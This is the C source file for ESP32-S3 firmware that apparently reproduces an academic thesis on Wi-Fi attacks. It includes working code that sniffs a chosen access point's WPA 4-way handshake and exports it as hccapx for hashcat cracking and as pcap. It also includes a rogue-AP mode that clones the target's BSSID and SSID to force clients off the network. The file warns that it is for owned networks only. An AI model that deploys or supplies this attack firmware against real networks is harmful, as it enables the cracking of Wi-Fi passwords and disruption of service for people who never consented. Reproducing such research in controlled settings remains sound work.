/**
 * @file main.c
 * @brief ESP32-S3 reproduction of "Wi-Fi attacks using ESP32"
 *        by Richard Stehlik (FIT VUTBR, 2021)
 *
 * Two operating modes:
 *
 *   1) HANDSHAKE CAPTURE (produces the handshake file)
 *      Promiscuous sniffer on the target AP's channel -> EAPOL-Key parsing ->
 *      hccapx (hashcat) + pcap (Wireshark) -> base64 over serial console.
 *
 *   2) PATH B ROGUE-AP DEAUTH (paper sec. 3.3 / Fig. 5)
 *      Clone target BSSID/SSID/channel and let native 802.11i deauthentication
 *      happen - no raw frame injection, no closed-source wsl_bypasser.
 *
 * LEGAL / ETHICAL NOTICE:
 *   Academic reproduction. Only run against an ACCESS POINT YOU OWN or are
 *   EXPLICITLY AUTHORISED TO TEST. The target SSID is typed manually - there
 *   is no automatic scan-and-attack loop.
 */
#include <stdio.h>
#include <stdint.h>
#include <stdbool.h>
#include <stdlib.h>
#include <string.h>

#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "esp_log.h"
#include "esp_err.h"
#include "esp_wifi.h"
#include "esp_system.h"
#include "esp_event.h"
#include "esp_timer.h"
#include "nvs_flash.h"
#include "driver/uart.h"
#include "mbedtls/base64.h"

#include "wifi_controller.h"
#include "ap_scanner.h"
#include "sniffer.h"
#include "frame_analyzer.h"
#include "frame_analyzer_types.h"
#include "hccapx_serializer.h"
#include "pcap_serializer.h"

static const char *TAG = "repro";

/* Capture settings */
#define CAPTURE_TIMEOUT_SEC   120   /* max time to wait for a handshake */
#define CAPTURE_EXTRA_SEC     3     /* extra seconds to collect remaining frames */

static volatile bool s_handshake_ready = false;

/* Configurable via menuconfig; see Kconfig.projbuild */
#ifndef CONFIG_REPRO_TARGET_SSID
#define CONFIG_REPRO_TARGET_SSID ""
#endif
#ifndef CONFIG_REPRO_RUN_DEMO
#define CONFIG_REPRO_RUN_DEMO 0
#endif
#ifndef CONFIG_REPRO_DEMO_SECONDS
#define CONFIG_REPRO_DEMO_SECONDS 30
#endif

/* ------------------------------------------------------------------ */
/* Minimal line reader from UART0 (stdin)                               */
/* ------------------------------------------------------------------ */
static int read_line(char *buf, int max_len) {
    int len = 0;
    while (len < max_len - 1) {
        char c;
        int n = uart_read_bytes(UART_NUM_0, (uint8_t *)&c, 1, portMAX_DELAY);
        if (n <= 0) continue;
        if (c == '\r') continue;
        if (c == '\n') break;
        buf[len++] = c;
    }
    buf[len] = '\0';
    return len;
}

/* Raw UART output (no ESP_LOG prefix) so the Mac helper can parse base64 */
static void uart_print(const char *s) {
    if (s && *s) {
        uart_write_bytes(UART_NUM_0, s, strlen(s));
    }
}

/* Print binary blob as marked base64 blocks, 76 chars per line */
static void print_base64(const char *label, const uint8_t *data, size_t len) {
    size_t b64_len = 0;
    if (mbedtls_base64_encode(NULL, 0, &b64_len, data, len) != 0) {
        ESP_LOGE(TAG, "base64 size query failed for %s", label);
        return;
    }
    uint8_t *b64 = (uint8_t *)malloc(b64_len + 1);
    if (b64 == NULL) {
        ESP_LOGE(TAG, "out of memory encoding %s", label);
        return;
    }
    if (mbedtls_base64_encode(b64, b64_len, &b64_len, data, len) != 0) {
        ESP_LOGE(TAG, "base64 encode failed for %s", label);
        free(b64);
        return;
    }

    char hdr[128];
    snprintf(hdr, sizeof(hdr), "\r\n===%s_BEGIN===\r\n", label);
    uart_print(hdr);

    for (size_t off = 0; off < b64_len; /* advanced below */) {
        size_t chunk = b64_len - off;
        if (chunk > 76) chunk = 76;
        uart_write_bytes(UART_NUM_0, (const char *)(b64 + off), chunk);
        uart_print("\r\n");
        off += chunk;
    }

    snprintf(hdr, sizeof(hdr), "===%s_END===\r\n", label);
    uart_print(hdr);
    free(b64);
}

/* ------------------------------------------------------------------ */
/* AP list helpers                                                      */
/* ------------------------------------------------------------------ */
static void print_ap_list(void) {
    wifictl_scan_nearby_aps();
    const wifictl_ap_records_t *recs = wifictl_get_ap_records();
    ESP_LOGI(TAG, " nearby APs: %u", recs->count);
    for (unsigned i = 0; i < recs->count; i++) {
        const wifi_ap_record_t *ap = &recs->records[i];
        ESP_LOGI(TAG, "  [%u] %-32s BSSID=" MACSTR " ch=%u rssi=%d",
                 i, (char *)ap->ssid, MAC2STR(ap->bssid), ap->primary, ap->rssi);
    }
}

static const wifi_ap_record_t *find_ap_by_ssid(const char *ssid) {
    const wifictl_ap_records_t *recs = wifictl_get_ap_records();
    for (unsigned i = 0; i < recs->count; i++) {
        if (strncmp((char *)recs->records[i].ssid, ssid, 32) == 0) {
            return &recs->records[i];
        }
    }
    return NULL;
}

/* ------------------------------------------------------------------ */
/* MODE 1: handshake capture -> hccapx + pcap export                    */
/* ------------------------------------------------------------------ */

/**
 * Event handler for FRAME_ANALYZER_EVENTS / DATA_FRAME_EVENT_EAPOLKEY_FRAME.
 * event_data is a copy of wifi_promiscuous_pkt_t (rx_ctrl + 802.11 payload).
 */
static void eapol_frame_handler(void *arg, esp_event_base_t base,
                                int32_t id, void *event_data) {
    wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)event_data;
    if (pkt == NULL) return;

    unsigned frame_len = pkt->rx_ctrl.sig_len;
    if (frame_len == 0) return;

    /* Keep the raw 802.11 frame for Wireshark */
    pcap_serializer_append_frame((const uint8_t *)pkt->payload, frame_len,
                                 (unsigned)esp_timer_get_time());

    /* Feed the frame into the hccapx state machine (M1..M4) */
    hccapx_serializer_add_frame((data_frame_t *)pkt->payload);

    /* message_pair != 255 means a usable handshake was assembled */
    if (hccapx_serializer_get() != NULL) {
        s_handshake_ready = true;
    }
}

static void capture_handshake(const wifi_ap_record_t *target) {
    ESP_LOGI(TAG, "==================================================");
    ESP_LOGI(TAG, " HANDSHAKE CAPTURE MODE");
    ESP_LOGI(TAG, " Target : %s", (char *)target->ssid);
    ESP_LOGI(TAG, " BSSID  : " MACSTR, MAC2STR(target->bssid));
    ESP_LOGI(TAG, " Channel: %u", target->primary);
    ESP_LOGI(TAG, " Authorised / own networks only.");
    ESP_LOGI(TAG, "==================================================");

    s_handshake_ready = false;
    hccapx_serializer_init(target->ssid, strlen((char *)target->ssid));
    pcap_serializer_init();

    ESP_ERROR_CHECK(esp_event_handler_register(
        FRAME_ANALYZER_EVENTS, DATA_FRAME_EVENT_EAPOLKEY_FRAME,
        &eapol_frame_handler, NULL));

    frame_analyzer_capture_start(SEARCH_HANDSHAKE, target->bssid);
    wifictl_sniffer_filter_frame_types(true, false, false);
    wifictl_sniffer_start(target->primary);

    ESP_LOGI(TAG, "Sniffer running. NOW disconnect and reconnect a client");
    ESP_LOGI(TAG, "(phone / laptop) on '%s' to trigger the 4-way handshake.",
             (char *)target->ssid);
    ESP_LOGI(TAG, "Waiting up to %d s ...", CAPTURE_TIMEOUT_SEC);

    int waited = 0;
    while (!s_handshake_ready && waited < CAPTURE_TIMEOUT_SEC) {
        vTaskDelay(pdMS_TO_TICKS(1000));
        waited++;
        if ((waited % 10) == 0) {
            ESP_LOGI(TAG, "  ... %d/%d s", waited, CAPTURE_TIMEOUT_SEC);
        }
    }

    if (s_handshake_ready) {
        ESP_LOGI(TAG, "Handshake M1/M2 captured. Collecting %d more seconds...",
                 CAPTURE_EXTRA_SEC);
        vTaskDelay(pdMS_TO_TICKS(CAPTURE_EXTRA_SEC * 1000));
    } else {
        ESP_LOGW(TAG, "Timed out without a complete handshake.");
    }

    wifictl_sniffer_stop();
    frame_analyzer_capture_stop();
    esp_event_handler_unregister(FRAME_ANALYZER_EVENTS,
                                 DATA_FRAME_EVENT_EAPOLKEY_FRAME,
                                 &eapol_frame_handler);

    /* ---- export ---- */
    hccapx_t *hc = hccapx_serializer_get();
    if (hc != NULL) {
        ESP_LOGI(TAG, "HCCAPX ready: message_pair=%u eapol_len=%u. Exporting...",
                 hc->message_pair, hc->eapol_len);
        print_base64("HCCAPX", (const uint8_t *)hc, sizeof(hccapx_t));
    } else {
        ESP_LOGW(TAG, "No usable hccapx was produced.");
    }

    unsigned pcap_size = pcap_serializer_get_size();
    if (pcap_size > sizeof(pcap_global_header_t)) {
        ESP_LOGI(TAG, "PCAP ready: %u bytes. Exporting...", pcap_size);
        print_base64("PCAP", pcap_serializer_get_buffer(), pcap_size);
    }
    pcap_serializer_deinit();

    /* Restore the management AP after the sniffing channel switch */
    wifictl_mgmt_ap_start();
    ESP_LOGI(TAG, "Export done. Management AP restored.");
}

/* ------------------------------------------------------------------ */
/* MODE 2: Path B - clone AP deauthentication                           */
/* ------------------------------------------------------------------ */
static void run_rogue_ap(const wifi_ap_record_t *target, int seconds) {
    ESP_LOGW(TAG, "=== Path B: clone AP of '%s' ===", (char *)target->ssid);
    ESP_LOGW(TAG, "Authorised-use only. Target must be your own AP.");

    wifictl_set_ap_mac(target->bssid);
    ESP_LOGI(TAG, "AP MAC cloned to BSSID " MACSTR, MAC2STR(target->bssid));

    wifi_config_t ap_config = {
        .ap = {
            .ssid_len = strlen((char *)target->ssid),
            .channel = target->primary,
            .authmode = target->authmode,
            .password = "dummypassword",
            .max_connection = 1,
        },
    };
    memcpy(ap_config.ap.ssid, target->ssid, 32);
    wifictl_ap_start(&ap_config);

    ESP_LOGI(TAG, "Clone AP running on channel %u for %d s.",
             target->primary, seconds);
    for (int i = 0; i < seconds; i++) {
        vTaskDelay(pdMS_TO_TICKS(1000));
        if ((i + 1) % 5 == 0) {
            ESP_LOGI(TAG, "  ... %d/%d s", i + 1, seconds);
        }
    }

    wifictl_ap_stop();
    wifictl_restore_ap_mac();
    wifictl_mgmt_ap_start();
    ESP_LOGI(TAG, "Demo finished. AP MAC restored, management AP back up.");
}

/* ------------------------------------------------------------------ */
/* entry point                                                          */
/* ------------------------------------------------------------------ */
void app_main(void) {
    esp_err_t ret = nvs_flash_init();
    if (ret == ESP_ERR_NVS_NO_FREE_PAGES || ret == ESP_ERR_NVS_NEW_VERSION_FOUND) {
        ESP_ERROR_CHECK(nvs_flash_erase());
        ret = nvs_flash_init();
    }
    ESP_ERROR_CHECK(ret);

    ESP_LOGI(TAG, "==================================================");
    ESP_LOGI(TAG, " Wi-Fi attacks using ESP32 - S3 reproduction");
    ESP_LOGI(TAG, " Academic research on YOUR OWN router only.");
    ESP_LOGI(TAG, "==================================================");

    /* Initialise WiFi (AP+STA) and start management AP */
    wifictl_mgmt_ap_start();

    /* Scan once, reuse the result in both modes */
    ESP_LOGI(TAG, "Scanning nearby APs...");
    print_ap_list();

    int seconds = CONFIG_REPRO_DEMO_SECONDS;
    char line[8] = {0};

    ESP_LOGI(TAG, "--------------------------------------------------");
    ESP_LOGI(TAG, " 1) Capture handshake -> export .hccapx + .pcap");
    ESP_LOGI(TAG, " 2) Path B: clone-AP deauth (paper sec.3.3)");
    ESP_LOGI(TAG, "--------------------------------------------------");
    ESP_LOGI(TAG, "Type 1 or 2, then Enter:");
    read_line(line, sizeof(line));

    if (strcmp(line, "1") == 0) {
        char ssid[64] = {0};
        ESP_LOGI(TAG, "Type the EXACT SSID of YOUR OWN router:");
        read_line(ssid, sizeof(ssid));
        if (ssid[0] == '\0') {
            ESP_LOGW(TAG, "Empty SSID - nothing to do. Reboot to retry.");
            return;
        }
        const wifi_ap_record_t *target = find_ap_by_ssid(ssid);
        if (target == NULL) {
            ESP_LOGE(TAG, "SSID '%s' not found in scan results. Check spelling.", ssid);
            return;
        }
        capture_handshake(target);
        return;
    }

    if (strcmp(line, "2") == 0) {
        char ssid[64] = {0};
#if CONFIG_REPRO_RUN_DEMO
        strncpy(ssid, CONFIG_REPRO_TARGET_SSID, sizeof(ssid) - 1);
        ESP_LOGI(TAG, "Demo mode: using configured SSID '%s'", ssid);
#else
        ESP_LOGI(TAG, "Type the EXACT SSID of YOUR OWN router:");
        read_line(ssid, sizeof(ssid));
#endif
        if (ssid[0] == '\0') {
            ESP_LOGW(TAG, "Empty SSID - nothing to do. Reboot to retry.");
            return;
        }
        const wifi_ap_record_t *target = find_ap_by_ssid(ssid);
        if (target == NULL) {
            ESP_LOGE(TAG, "SSID '%s' not found in scan results. Check spelling.", ssid);
            return;
        }
        run_rogue_ap(target, seconds);
        return;
    }

    ESP_LOGE(TAG, "Invalid selection '%s'. Reboot to retry.", line);
}
